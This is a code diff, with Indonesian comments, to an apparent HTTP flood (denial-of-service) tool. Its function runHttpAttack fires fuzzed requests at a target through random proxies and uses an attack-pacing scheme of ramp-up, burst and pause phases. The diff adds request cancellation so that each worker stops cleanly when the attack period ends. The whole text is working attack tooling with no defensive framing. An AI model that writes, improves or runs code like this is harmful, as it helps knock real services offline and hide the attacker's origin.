@@ -13,6 +13,8 @@ function runHttpAttack(targetUrl, durationSeconds, attackType) {
 
     const target = url.parse(targetUrl);
 
+    const controller = new AbortController();
+
     // --- Algoritma Pacing Cerdas & Manipulasi Serangan ---
     let attackState = {
         phase: 'RAMP_UP', // RAMP_UP, BURST, PAUSE, RAMP_DOWN
@@ -61,7 +63,7 @@ function runHttpAttack(targetUrl, durationSeconds, attackType) {
         const finalUrl = fuzzUrl(targetUrl);
         
         const proxyUrl = proxyList.length > 0 ? proxyList[Math.floor(Math.random() * proxyList.length)] : undefined;
-        const options = getAxiosOptions(proxyUrl);
+        const options = getAxiosOptions(target, proxyUrl, controller.signal);
 
         localSent++;
 
@@ -146,6 +148,12 @@ function runHttpAttack(targetUrl, durationSeconds, attackType) {
 
     setTimeout(() => {
         isAttackActive = false;
+        // Batalkan semua permintaan jaringan yang sedang berlangsung.
+        // Ini adalah langkah kunci untuk memastikan proses dapat keluar dengan bersih
+        // tanpa menunggu timeout permintaan yang lama.
+        console.log(`Worker ${process.pid} menghentikan serangan dan membatalkan permintaan yang sedang berjalan...`);
+        controller.abort();
+
         clearInterval(statsInterval);
 
         // Kirim sisa statistik sebelum keluar
@@ -158,7 +166,10 @@ function runHttpAttack(targetUrl, durationSeconds, attackType) {
         }
 
         console.log(`Worker ${process.pid} telah menghentikan serangan ${attackName} ke ${target.host}.`);
-        process.exit(0);
+        // Beri sedikit waktu agar pembatalan selesai sebelum keluar paksa.
+        setTimeout(() => {
+            process.exit(0);
+        }, 500);
     }, durationSeconds * 1000);
 }
 
